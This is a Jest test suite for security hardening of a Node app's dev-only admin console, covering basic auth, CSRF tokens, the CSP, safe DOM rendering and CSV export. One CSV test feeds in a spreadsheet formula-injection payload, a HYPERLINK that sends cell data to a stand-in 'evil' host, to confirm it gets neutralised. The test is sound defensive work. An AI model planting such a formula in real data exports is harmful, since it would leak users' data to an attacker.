/**
 * Admin-dev ops console hardening tests.
 *
 * These exercise the dev-only console served at /admin-dev and its JSON API.
 * The console is basic-auth gated and, for mutating actions, additionally
 * CSRF-token gated.
 */
const path = require('path');
process.env.ADMIN_DEV_USER = process.env.ADMIN_DEV_USER || 'admin';
process.env.ADMIN_DEV_PASSWORD = process.env.ADMIN_DEV_PASSWORD || 'dev-secret';

const request = require('supertest');
const app = require('../app');
const { convertUsersToCSV } = require('../services/csvExport');
const { AUDIT_SOURCES } = require('../services/auditService');

const authHeader =
  'Basic ' +
  Buffer.from(`${process.env.ADMIN_DEV_USER}:${process.env.ADMIN_DEV_PASSWORD}`).toString('base64');

describe('admin-dev ops console', () => {
  test('GET /admin-dev/ops requires basic auth', async () => {
    const res = await request(app).get('/admin-dev/ops');
    expect(res.status).toBe(401);
  });

  test('GET /admin-dev/ops renders with CSRF token injected', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    expect(res.status).toBe(200);
    expect(res.text).toMatch(/<meta name="admin-dev-csrf" content="[0-9a-f]+">/);
    expect(res.headers['cache-control']).toMatch(/no-store/);
  });

  test('GET /admin-dev/ renders CSRF token', async () => {
    const res = await request(app).get('/admin-dev').set('Authorization', authHeader);
    expect(res.status).toBe(200);
    expect(res.text).toMatch(/<meta name="admin-dev-csrf" content="[0-9a-f]+">/);
  });

  test('POST reset-rate-limits is rejected without CSRF token', async () => {
    const res = await request(app)
      .post('/admin-dev/api/ops/reset-rate-limits')
      .set('Authorization', authHeader)
      .send({ confirm: 'CLEAR_RL' });
    expect(res.status).toBe(403);
  });

  test('GET /admin-dev/api/ops/users is paginated and hides soft-deleted by default', async () => {
    // With mongoose mocked, User.find returns a mock query that resolves to null;
    // we only assert the endpoint is mounted and auth-bound, not the data.
    const res = await request(app)
      .get('/admin-dev/api/ops/users?page=1&limit=5')
      .set('Authorization', authHeader);
    expect([200, 500]).toContain(res.status);
  });

  test('GET /admin-dev/api/ops/analytics/timeseries requires auth', async () => {
    const res = await request(app).get('/admin-dev/api/ops/analytics/timeseries');
    expect(res.status).toBe(401);
  });

  test('GET /admin-dev/static/chart.umd.js requires auth', async () => {
    const res = await request(app).get('/admin-dev/static/chart.umd.js');
    expect(res.status).toBe(401);
  });

  // ---- Phase 0: security hardening -------------------------------------

  test('401 body does not disclose the controlling env var', async () => {
    const res = await request(app).get('/admin-dev/ops');
    expect(res.status).toBe(401);
    expect(res.text).not.toMatch(/ADMIN_DEV_PASSWORD/);
  });

  test('a wrong password is rejected', async () => {
    const bad = 'Basic ' + Buffer.from(`${process.env.ADMIN_DEV_USER}:definitely-wrong`).toString('base64');
    const res = await request(app).get('/admin-dev/ops').set('Authorization', bad);
    expect(res.status).toBe(401);
  });

  test('CSRF token is not accepted from the request body', async () => {
    // It used to be honoured there so urlencoded posts could carry it, which
    // leaks it into access logs and proxy logs.
    const html = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    const token = html.text.match(/content="([0-9a-f]{64})"/)[1];
    const res = await request(app)
      .post('/admin-dev/api/ops/reset-rate-limits')
      .set('Authorization', authHeader)
      .type('form')
      .send({ confirm: 'CLEAR_RL', csrf: token });
    expect(res.status).toBe(403);
  });

  test('CSRF token in the correct header is accepted', async () => {
    const html = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    const token = html.text.match(/content="([0-9a-f]{64})"/)[1];
    // Proceeds past the CSRF gate; may still fail on the confirm body or the
    // Valkey call, but must not be a 403.
    const res = await request(app)
      .post('/admin-dev/api/ops/reset-rate-limits')
      .set('Authorization', authHeader)
      .set('x-admin-dev-csrf', token)
      .send({ confirm: 'NOT_CLEAR_RL' });
    expect(res.status).not.toBe(403);
  });

  test('CSP forbids framing, so destructive buttons cannot be clickjacked', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    expect(res.headers['content-security-policy']).toMatch(/frame-ancestors 'none'/);
  });

  test('the ops page builds rows with the DOM instead of innerHTML', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    // The user table was templated into innerHTML with raw firstName/lastName,
    // and its row button inlined the email into an onclick attribute. Both are
    // injection vectors given the CSP allows 'unsafe-inline'. (The remaining
    // static onclick="lookupUser()" carries no user data and is fine.)
    expect(res.text).not.toMatch(/usersTable'\)\.innerHTML/);
    expect(res.text).not.toMatch(/onclick="lookupUser\('\$\{/);
    expect(res.text).toMatch(/replaceChildren\(table\)/);
    expect(res.text).toMatch(/closest\('button\[data-email\]'\)/);
  });

  test('CSV export neutralises spreadsheet formula injection', () => {
    const csv = convertUsersToCSV([
      { _id: '1', email: 'e@example.com', firstName: '=HYPERLINK("http://evil/?d="&A1,"x")' },
      { _id: '2', email: 'f@example.com', firstName: '+1-555-0100' },
      { _id: '3', email: 'g@example.com', firstName: '@SUM(A1:A9)' },
      { _id: '4', email: 'h@example.com', firstName: 'Ada' },
    ]);
    const lines = csv.split('\n');
    // Dangerous leading characters get a literal-quote prefix.
    expect(lines[1]).toContain("'=HYPERLINK");
    expect(lines[2]).toContain("'+1-555-0100");
    expect(lines[3]).toContain("'@SUM");
    // Benign values are untouched.
    expect(lines[4]).toContain(',Ada,');
  });

  test('CSV export still quotes separators and quotes', () => {
    const csv = convertUsersToCSV([
      { _id: '1', email: 'a@example.com', lastName: 'O"Hara, Jr' },
    ]);
    expect(csv).toContain('"O""Hara, Jr"');
  });

  test('AUDIT_SOURCES tags admin-dev writes without touching app writes', () => {
    expect(AUDIT_SOURCES.ADMIN_DEV).toBe('admin-dev');
    expect(AUDIT_SOURCES.APP).toBe('app');
  });

  test('audit-recent prefers the indexed source field', async () => {
    // A regression guard: the query used to anchor a regex on `reason`,
    // which Mongo cannot serve from a B-tree index.
    const src = require('fs').readFileSync(
      require('path').join(__dirname, '../routes/adminDevRoutes.js'),
      'utf8'
    );
    expect(src).toMatch(/find\(\{ source: AUDIT_SOURCES\.ADMIN_DEV \}\)/);
  });

  // ---- Phase 1: instance health ----------------------------------------

  test('GET /api/ops/instance requires auth', async () => {
    const res = await request(app).get('/admin-dev/api/ops/instance');
    expect(res.status).toBe(401);
  });

  test('instance payload is labelled as per-instance, not platform history', async () => {
    const res = await request(app)
      .get('/admin-dev/api/ops/instance')
      .set('Authorization', authHeader);
    expect(res.status).toBe(200);
    const d = res.body.data;
    // These counters are process-local and reset on deploy / cold start, so
    // the payload must say so rather than implying durable history.
    expect(d.scope).toBe('this-instance');
    expect(d.caveat).toMatch(/reset on deploy/i);
    expect(typeof d.hasTraffic).toBe('boolean');
  });

  test('instance payload normalises the [name, count] error tuples', async () => {
    const res = await request(app)
      .get('/admin-dev/api/ops/instance')
      .set('Authorization', authHeader);
    const d = res.body.data;
    // getErrorMetrics returns Object.entries(...) tuples. They must be
    // reshaped to objects, or every renderer downstream breaks.
    for (const row of [...d.errors.topErrorTypes, ...d.errors.topErrorEndpoints]) {
      expect(typeof row).toBe('object');
      expect(Array.isArray(row)).toBe(false);
    }
    expect(Array.isArray(d.latency)).toBe(true);
    expect(Array.isArray(d.connections)).toBe(true);
  });

  test('instance latency rows are capped so one instance cannot flood the page', async () => {
    const src = require('fs').readFileSync(
      require('path').join(__dirname, '../routes/adminDevRoutes.js'),
      'utf8'
    );
    expect(src).toMatch(/LATENCY_ROW_LIMIT = 25/);
  });

  test('instance health panel is collapsed', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    // Collapsed so its detail is opt-in. It IS fetched on first paint, because
    // the header build identity comes from the same payload — issuing a second
    // request for five fields would be wasteful.
    expect(res.text).toMatch(/<details id="instanceHealth">/);
    expect(res.text).not.toMatch(/<details id="instanceHealth" open/);
  });

  test('instance payload is fetched exactly once, not once per consumer', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    const js = (res.text.match(/<script>\n([\s\S]*?)\n<\/script>/) || [])[1] || '';
    // Scope to the boot block. Matching on any line containing loadStats() is
    // unreliable — refreshAll() opens with the same calls.
    const boot = js.slice(js.lastIndexOf('const hadState'));
    expect(boot).toContain('loadStats();');
    // loadInstance() fires exactly once at boot; the header build identity
    // comes from the same response, so a second call would be a duplicate.
    expect((boot.match(/loadInstance\(\)/g) || [])).toHaveLength(1);
    // A separate build-info fetch would duplicate the same request.
    expect(res.text).not.toMatch(/loadBuildInfo/);
  });

  test('the console reports which build it is talking to', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    expect(res.text).toMatch(/id="buildInfo"/);
  });

  test('instance health carries the cold-start caveat into the UI', async () => {
    const res = await request(app).get('/admin-dev/ops').set('Authorization', authHeader);
    expect(res.text).toMatch(/Reset on every deploy and on Cloud Run scale-to-zero cold start/);
    expect(res.text).toMatch(/this instance only/i);
  });
});
